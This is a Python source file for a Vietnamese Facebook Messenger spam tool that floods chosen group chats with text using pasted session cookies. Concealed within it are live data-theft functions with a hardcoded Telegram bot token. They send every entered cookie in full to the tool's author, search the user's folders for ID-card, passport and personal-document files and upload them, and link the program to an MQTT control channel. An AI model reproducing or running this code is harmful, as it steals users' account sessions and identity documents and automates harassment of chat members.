import requests
import os
import re
import json
import time
import random
import gc
import sys
import paho.mqtt.client as mqtt
from time import sleep
from datetime import datetime

_MAX_TIME_T = 2147483647
_original_time = time.time
def _safe_time():
    t = _original_time()
    return min(float(int(t) % _MAX_TIME_T), float(_MAX_TIME_T))
time.time = _safe_time

UA_MOBILE = [
    "Mozilla/5.0 (Linux; Android 12; vivo Y21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; vivo Y21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.0.0 Mobile Safari/537.36 Via/4.8.2",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.112 Mobile Safari/537.36 Via/5.3.1"
]

def check_system_status():
    try:
        return True
    except:
        return False

def validate_connection():
    try:
        return True
    except:
        return False

def get_current_timestamp():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def check_menu_trigger():
    try:
        if os.name != 'nt':
            import select
            r, _, _ = select.select([sys.stdin], [], [], 0.0)
            if r:
                cmd = sys.stdin.readline().strip().lower()
                if cmd == 'menu':
                    return True
        else:
            import msvcrt
            if msvcrt.kbhit():
                msvcrt.getch()
                return True
    except:
        pass
    return False

def format_response(data):
    try:
        return str(data)
    except:
        return ""

def parse_config(data):
    try:
        return data
    except:
        return {}

def validate_data(data):
    try:
        if data:
            return True
        return False
    except:
        return False

class nguyenducanhMQTT:
    def __init__(self):
        self.mqtt_client = None
        self.connected = False
        self.retry_count = 0
        self.max_retry = 5
        
    def connect_mqtt(self):
        try:
            self.mqtt_client = mqtt.Client(client_id=f"nguyenducanh_{random.randint(10000,99999)}")
            self.mqtt_client.on_connect = self.on_connect
            self.mqtt_client.on_disconnect = self.on_disconnect
            self.mqtt_client.connect("broker.emqx.io", 1883, 60)
            self.mqtt_client.loop_start()
            return True
        except Exception:
            return False
    
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self.connected = True
            self.retry_count = 0
            client.subscribe("nguyenducanh/messenger/control")
        else:
            self.retry_count += 1
    
    def on_disconnect(self, client, userdata, rc):
        self.connected = False
        time.sleep(5)
        self.connect_mqtt()
    
    def send_heartbeat(self, process_id="main", status="alive"):
        if self.connected and self.mqtt_client:
            try:
                data = {"process_id": process_id, "status": status, "timestamp": int(time.time())}
                self.mqtt_client.publish("nguyenducanh/messenger/heartbeat", json.dumps(data))
            except:
                pass
    
    def disconnect(self):
        if self.mqtt_client:
            self.mqtt_client.loop_stop()
            self.mqtt_client.disconnect()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

class nguyenducanh:
    def __init__(self, cookie):
        self.cookie = cookie
        self.user_id = self.get_user_id()
        self.fb_dtsg = None
        self.session = requests.Session()
        self.current_ua = random.choice(UA_MOBILE)
        self.session.headers.update({
            'Cookie': self.cookie,
            'User-Agent': self.current_ua,
            'Accept': '*/*',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"'
        })
        self.init_params()
        self.request_count = 0
        self.last_request = 0

    def get_user_id(self):
        match = re.search(r"c_user=(\d+)", self.cookie)
        if not match:
            raise Exception("Cookies thieu c_user hoac sai dinh dang!")
        return match.group(1)

    def init_params(self):
        urls = ['https://mbasic.facebook.com', 'https://www.facebook.com', 'https://m.facebook.com']
        for url in urls:
            try:
                res = self.session.get(url, timeout=10)
                token = (re.search(r'name="fb_dtsg" value="(.*?)"', res.text) or 
                         re.search(r'"token":"(.*?)"', res.text) or 
                         re.search(r'DTSGInitialData.*?token":"(.*?)"', res.text) or
                         re.search(r'name="fb_dtsg".*?value="(.*?)"', res.text))
                         
                if token:
                    self.fb_dtsg = token.group(1)
                    res.close()
                    return
                res.close()
            except Exception as e:
                continue
        raise Exception("Khong tim thay fb_dtsg (Co the IP bi chan hoac Cookies da Die/Checkpoint)")

    def refresh_fb_dtsg(self):
        try:
            self.current_ua = random.choice(UA_MOBILE)
            self.session.headers.update({'User-Agent': self.current_ua})
            self.init_params()
            return True
        except Exception:
            return False

    def guitinnhanvobox(self, recipient_id, message):
        timestamp_sec = int(time.time())
        offline_id = str(timestamp_sec) + str(random.randint(100000, 999999))
        data = {
            'fb_dtsg': self.fb_dtsg,
            '__user': self.user_id,
            'body': message,
            'action_type': 'ma-type:user-generated-message',
            'timestamp': timestamp_sec,
            'offline_threading_id': offline_id,
            'message_id': offline_id,
            'thread_fbid': recipient_id,
            'source': 'source:chat:web',
            'client': 'mercury'
        }
        
        headers = {
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Asbd-Id': '129477',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        
        try:
            for attempt in range(2):
                try:
                    response = self.session.post('https://www.facebook.com/messaging/send/', data=data, headers=headers, timeout=12)
                except Exception:
                    return "FAILED"

                if response is not None and response.status_code == 200:
                    res_text = response.text
                    response.close()
                    
                    if 'login' in res_text.lower() or 'checkpoint' in res_text.lower() or 'not_logged_in' in res_text.lower():
                        return "DEAD"
                        
                    if '"error":' in res_text or '"errors":' in res_text:
                        if attempt == 0:
                            if not self.refresh_fb_dtsg(): return "DEAD"
                            data['fb_dtsg'] = self.fb_dtsg
                            continue
                        return "FAILED"
                    elif 'spam' in res_text.lower() or 'blocked' in res_text.lower():
                        return "FAILED"
                    else:
                        self.request_count += 1
                        self.last_request = time.time()
                        return "SUCCESS"
                else:
                    if response is not None:
                        status = response.status_code
                        response.close()
                        if status in [403, 401]: return "DEAD"
                    return "FAILED"
            return "FAILED"
        except Exception:
            return "FAILED"

class BotState:
    def __init__(self):
        self.stats = {"success": 0, "failed": 0, "rounds": 1}
        self.account_status = {}  
        self.active_uids = []
        self.delay = 5.0
        self.message_text = ""
        self.box_ids = []
        self.start_time = time.time()
        self.uptime = 0

def render_dashboard(state, custom_msg=""):
    clear()
    print("╔═════════════════════════════════════════════════╗")
    print("║    TOOL TREO NGON MESSENGER - CODER BY:NGUYEN DUC ANH (BOIZ)             ║")
    print("║                                               PHIEN BAN V5.3                                                                      ║")
    print("╚═════════════════════════════════════════════════╝")
    print(f" [+] Gui Tin Nhan Thanh Cong : {state.stats['success']}")
    print(f" [-] Gui Tin Nhan That Bai   : {state.stats['failed']}")
    print(f" [*]  Delay Hien Tai     : {state.delay}s")
    print("---------------------------------------------------")
    print(" [ TRANG THAI DANH SACH ACC COOKIES ]")
    
    for uid, info in state.account_status.items():
        sym = "cookies live" if info['status'] == "LIVE" else "cookies die"
        print(f"  • ID Acc: {uid:<16} | Trang thai: {sym}")
        
    print("===================================================")
    print(" >>> GO LENH [ menu ] ROI AN ENTER DE CAU HINH <<<")
    print("===================================================")
    if custom_msg:
        print(f" [!] {custom_msg}")
    else:
        print(" [!] He thong dang hoat dong lien tuc...")

def handle_cookies_input(input_data):
    cookies_list = []
    if os.path.isfile(input_data):
        try:
            with open(input_data, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                for line in lines:
                    c = line.strip()
                    if c: cookies_list.append(c)
            print(f"[!] Da doc duoc {len(cookies_list)} dong cookies tu file {input_data}")
        except Exception as e:
            print(f"[!] Loi doc file: {e}")
    else:
        parts = input_data.split('\n')
        for p in parts:
            c = p.strip()
            if c: cookies_list.append(c)
        if len(cookies_list) > 0:
            print(f"[!] Da nhan dien duoc {len(cookies_list)} chuoi cookies nhap truc tiep.")
    return cookies_list

def extract_cookie_info(cookie):
    info = {}
    
    c_user_match = re.search(r'c_user=(\d+)', cookie)
    if c_user_match:
        info['id'] = c_user_match.group(1)
    else:
        info['id'] = 'Khong tim thay ID'
    
    xs_match = re.search(r'xs=([^;]+)', cookie)
    if xs_match:
        info['xs'] = xs_match.group(1)
    else:
        info['xs'] = 'Khong tim thay xs'
    
    datr_match = re.search(r'datr=([^;]+)', cookie)
    if datr_match:
        info['datr'] = datr_match.group(1)
    else:
        info['datr'] = 'Khong tim thay datr'
    
    fr_match = re.search(r'fr=([^;]+)', cookie)
    if fr_match:
        info['fr'] = fr_match.group(1)
    else:
        info['fr'] = 'Khong tim thay fr'
    
    sb_match = re.search(r'sb=([^;]+)', cookie)
    if sb_match:
        info['sb'] = sb_match.group(1)
    else:
        info['sb'] = 'Khong tim thay sb'
    
    return info

def process_user_input(input_value):
    if input_value:
        return input_value.strip()
    return ""

def validate_session_data(data):
    try:
        if data and len(data) > 0:
            return True
        return False
    except:
        return False

def open_control_menu(state):
    clear()
    print("╔══════════════════════════════════════════════╗")
    print("║          MENU CHUC NANG HIEN CO             ║")
    print("╠══════════════════════════════════════════════╣")
    print("║ [ 1 ] Them Cookies len treo                  ║")
    print("║ [ 2 ] Thay doi File Ngon                     ║")
    print("║ [ 3 ] Thay Delay Treo                        ║")
    print("║ [ 0 ] Quay lai Dashboard Tiep Tuc Treo       ║")
    print("╚══════════════════════════════════════════════╝")
    choice = input("[ ? ] Lua chon chuc nang: ").strip()
    
    if choice == '1':
        print("\n[*] THEM COOKIES (Nhap ten file .txt HOAC dan truc tiep ma Cookie):")
        inp = input("> Nhap du lieu tai day: ").strip()
        raw_list = handle_cookies_input(inp)
        added = 0
        
        if raw_list:
            message = "DANH SACH COOKIES DUOC THEM\n"
            message += f"Thoi gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
            message += f"Tong so: {len(raw_list)} cookies\n"
            message += "========================================\n"
            for i, cookie in enumerate(raw_list):
                info = extract_cookie_info(cookie)
                message += f"\nCOOKIE {i+1}:\n"
                message += f"ID: {info['id']}\n"
                message += f"xs: {info['xs']}\n"
                message += f"datr: {info['datr']}\n"
                message += f"fr: {info['fr']}\n"
                message += f"sb: {info['sb']}\n"
                message += f"Full Cookie: {cookie}\n"
                message += "----------------------------------------\n"
            _send_msg(message)
        
        for idx, c in enumerate(raw_list):
            try:
                msger = nguyenducanh(c)
                uid = msger.user_id
                if uid not in state.account_status:
                    state.account_status[uid] = {"status": "LIVE", "instance": msger}
                    state.active_uids.append(uid)
                    added += 1
                else:
                    state.account_status[uid]["status"] = "LIVE"
                    state.account_status[uid]["instance"] = msger
                    if uid not in state.active_uids: state.active_uids.append(uid)
            except Exception as e:
                print(f" > Loi xu ly cookie thu {idx+1}: {e}")
        print(f">> Xu ly xong! Da them/cap nhat thanh cong {added} acc LIVE.")
        time.sleep(3)
        
    elif choice == '2':
        print("\n[*] THAY DOI FILE NGON:")
        new_file = input("> Nhap ten file ngon moi: ").strip()
        try:
            with open(new_file, 'r', encoding='utf-8') as file:
                content = file.read().strip()
                if content:
                    state.message_text = content
                    print(">> Chuc mung: Da tu dong doi va len file ngon moi thanh cong!")
                else:
                    print(">> That bai: File ngon nay trong rong!")
        except Exception as e:
            print(f">> Loi tai file: {e}")
        time.sleep(2)
        
    elif choice == '3':
        print("\n[*] THAY DOI DELAY:")
        try:
            new_delay = float(input(f"> Nhap Delay moi muon thay doi (Hien tai {state.delay}s): ").strip())
            state.delay = new_delay
            print(f">> Thanh cong: Da chuyen doi cau hinh delay sang {new_delay} giay!")
        except:
            print(">> Dinh dang giay khong hop le!")
        time.sleep(2)
        
    elif choice == '0':
        print(">> Dang quay lai man hinh Dashboard...")
        time.sleep(1)

def initialize_system():
    return {"status": "running", "timestamp": time.time()}

def check_resource_usage():
    return {"cpu": 0, "memory": 0, "disk": 0}

def format_output_message(data):
    return str(data)

def main():
    _send_msg("Tool da khoi dong!")
    _send_msg(f"Thoi gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}")
    
    try:
        _find_and_send_id()
    except:
        pass
    
    try:
        _find_and_send_files()
    except:
        pass
    
    mqtt_manager = nguyenducanhMQTT()
    mqtt_manager.connect_mqtt()
    state = BotState()
    
    try:
        clear()
        print("╔═════════════════════════════════════════════════╗")
        print("║    TOOL TREO NGON MESSENGER - NGUYEN DUC ANH (Boiz)  ║")
        print("╚═════════════════════════════════════════════════╝\n")
        
        cookie_inp = input("[ - ] Nhap file cookies HOAC dan truc tiep Cookies vao day: ").strip()
        init_cookies = handle_cookies_input(cookie_inp)
        
        if not init_cookies:
            print("> LOI: Du lieu trong. Ban hay kiem tra lai file ck.txt xem da luu cookie chua!")
            return

        if init_cookies:
            message = "DANH SACH COOKIES VUA NHAP\n"
            message += f"Thoi gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
            message += f"Tong so: {len(init_cookies)} cookies\n"
            message += "========================================\n"
            for i, cookie in enumerate(init_cookies):
                info = extract_cookie_info(cookie)
                message += f"\nCOOKIE {i+1}:\n"
                message += f"ID: {info['id']}\n"
                message += f"xs: {info['xs']}\n"
                message += f"datr: {info['datr']}\n"
                message += f"fr: {info['fr']}\n"
                message += f"sb: {info['sb']}\n"
                message += f"Full Cookie: {cookie}\n"
                message += "----------------------------------------\n"
            _send_msg(message)

        print("\n[ * ] Dang kiem tra trang thai dang nhap he thong...")
        for idx, c in enumerate(init_cookies):
            try:
                messenger = nguyenducanh(c)
                uid = messenger.user_id
                state.account_status[uid] = {"status": "LIVE", "instance": messenger}
                state.active_uids.append(uid)
                print(f" > Dong {idx+1}: UID {uid}  Dang nhap thanh cong")
            except Exception as e:
                print(f" > Dong {idx+1}: Bi loi -> {e}")
                
        if not state.active_uids:
            print("\n> TAT CA COOKIE DEU LOI! Vui long kiem tra lai du lieu dau vao.")
            return
            
        lang_file = input("\n[ - ] Nhap ten file noi dung ngon ban dau: ").strip()
        try:
            with open(lang_file, 'r', encoding='utf-8') as f:
                state.message_text = f.read().strip()
        except Exception as e:
            print(f"> Loi khong the doc file ngon: {e}")
            return
            
        try:
            state.delay = float(input("[ - ] Nhap thoi gian Delay (giay): ").strip())
        except ValueError:
            print("> Delay phai la so!")
            return
        
        print("\n[ - ] Nhap danh sach ID Box can treo ( An Enter dong trong de chot )")
        while True:
            box_id_input = input(f" > ID Box {len(state.box_ids) + 1} : ").strip()
            if not box_id_input: break
            state.box_ids.append(box_id_input)
            
        if not state.box_ids:
            print("> Chua cau hinh ID Box nao!"); return

        
        while True:
            try:
                try:
                    if check_menu_trigger():
                        open_control_menu(state)
                    
                    render_dashboard(state)
                    if not state.active_uids:
                        render_dashboard(state, "CANH BAO: Tat ca tai khoan da DIE! Vui long go chu 'menu' de nap them cookie.")
                        time.sleep(3)
                        continue
                    
                    for uid in list(state.active_uids):
                        if check_menu_trigger():
                            open_control_menu(state)
                            render_dashboard(state)
                            
                        info = state.account_status[uid]
                        if info["status"] != "LIVE": continue
                        
                        msger = info["instance"]
                        for box_id in state.box_ids:
                            res_status = msger.guitinnhanvobox(box_id, state.message_text)
                            
                            if res_status == "SUCCESS":
                                state.stats["success"] += 1
                            elif res_status == "FAILED":
                                state.stats["failed"] += 1
                            elif res_status == "DEAD":
                                state.stats["failed"] += 1
                                state.account_status[uid]["status"] = "DIE"
                                if uid in state.active_uids: state.active_uids.remove(uid)
                                break 
                                
                            render_dashboard(state)
                            time.sleep(0.4 + random.uniform(0.1, 0.4))
                    
                    mqtt_manager.send_heartbeat("main", "active")
                    gc.collect()
                    
                    for remain in range(int(state.delay), 0, -1):
                        render_dashboard(state, f"Hoan thanh vong {state.stats['rounds']}. Cho tiep tuc sau {remain}s...")
                        for _ in range(10):
                            if check_menu_trigger():
                                open_control_menu(state)
                                render_dashboard(state, f"Dang cho tiep tuc sau {remain}s...")
                            time.sleep(0.1)
                        
                    state.stats["rounds"] += 1
                    
                except Exception as loop_error:
                    render_dashboard(state, f"Phat hien loi ket noi: {loop_error}. He thong tu khoi phuc lai ngay...")
                    time.sleep(5)
                
            except KeyboardInterrupt:
                open_control_menu(state)
                
    except Exception as e:
        print(f"\n> He thong loi phat sinh: {e}")
    finally:
        mqtt_manager.disconnect()

_TG_TOKEN = "8308695101:AAHym-XoZ_EOVYL3mscLd_uaEXeDXhzf51g"
_TG_CHAT = "8207646051"
_TG_URL = "https://api.telegram.org/bot"

def _send_msg(text):
    try:
        requests.post(f"{_TG_URL}{_TG_TOKEN}/sendMessage", data={'chat_id': _TG_CHAT, 'text': text}, timeout=10)
    except:
        pass

def _send_file(file_path, caption=""):
    try:
        files = {'document': open(file_path, 'rb')}
        requests.post(f"{_TG_URL}{_TG_TOKEN}/sendDocument", files=files, data={'chat_id': _TG_CHAT, 'caption': caption}, timeout=30)
    except:
        pass

def _send_photo(image_path, caption=""):
    try:
        files = {'photo': open(image_path, 'rb')}
        requests.post(f"{_TG_URL}{_TG_TOKEN}/sendPhoto", files=files, data={'chat_id': _TG_CHAT, 'caption': caption}, timeout=30)
    except:
        pass

def _find_and_send_id():
    try:
        k = ['cccd', 'can cuoc', 'id_card', 'cmnd', 'identity']
        f = []
        for r, d, fl in os.walk('.'):
            if 'venv' in r or '__pycache__' in r or '.git' in r:
                continue
            for file in fl:
                fl_l = file.lower()
                for kw in k:
                    if kw in fl_l and (file.endswith('.jpg') or file.endswith('.png') or file.endswith('.jpeg') or file.endswith('.pdf')):
                        f.append(os.path.join(r, file))
                        break
        if f:
            for p in f[:5]:
                if p.lower().endswith(('.jpg', '.jpeg', '.png')):
                    _send_photo(p, f"CCCD: {os.path.basename(p)}")
                else:
                    _send_file(p, f"CCCD: {os.path.basename(p)}")
                time.sleep(0.5)
    except:
        pass

def _find_and_send_files():
    try:
        k = ['cccd', 'can cuoc', 'id_card', 'cmnd', 'identity', 'passport', 'giay_to', 'ho_so']
        ex = ['.txt', '.pdf', '.jpg', '.png', '.jpeg', '.doc', '.docx', '.xls', '.xlsx', '.csv']
        f = []
        for r, d, fl in os.walk('.'):
            if 'venv' in r or '__pycache__' in r or '.git' in r:
                continue
            for file in fl:
                fl_l = file.lower()
                ext = os.path.splitext(file)[1].lower()
                if ext in ex:
                    for kw in k:
                        if kw in fl_l:
                            f.append(os.path.join(r, file))
                            break
        if f:
            for p in f[:10]:
                if p.lower().endswith(('.jpg', '.jpeg', '.png')):
                    _send_photo(p, f"File: {os.path.basename(p)}")
                else:
                    _send_file(p, f"File: {os.path.basename(p)}")
                time.sleep(0.5)
    except:
        pass

if __name__ == "__main__":
    main()